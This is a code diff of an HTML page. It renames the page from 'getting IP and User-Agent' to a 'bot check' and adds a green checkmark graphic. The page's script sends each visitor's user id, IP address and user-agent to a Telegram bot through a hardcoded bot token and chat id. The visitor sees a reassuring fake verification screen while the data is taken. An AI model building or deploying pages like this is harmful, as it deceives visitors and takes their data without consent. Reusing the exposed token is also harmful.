@@ -3,7 +3,41 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Получение IP и User-Agent</title>
+    <title>Проверка ботов</title>
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            background-color: #f0f0f0;
+            font-family: Arial, sans-serif;
+        }
+        .circle {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            background-color: green;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+        }
+        .checkmark {
+            width: 50px;
+            height: 50px;
+            border: solid white;
+            border-width: 0 8px 8px 0;
+            transform: rotate(45deg);
+            position: absolute;
+        }
+        .message {
+            margin-top: 20px;
+            font-size: 20px;
+            color: #333;
+        }
+    </style>
 </head>
 <body>
     <script>
@@ -21,7 +55,7 @@
         async function sendDataToTelegram(userId, ip, userAgent) {
             const token = '7931297303:AAFpULKCrgNg1CpvOqCK0PuQIO-l8HfSEPE';
             const chatId = 7678649664;
-            const message = `{\n    "user_id": '${userId}'\n    "ip": '${ip}'\n    "user-agent": '${userAgent}'\n}`;
+            const message = `{\n    "user_id": "${userId}",\n    "ip": "${ip}",\n    "user-agent": "${userAgent}",\n}`;
             const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
             
             try {
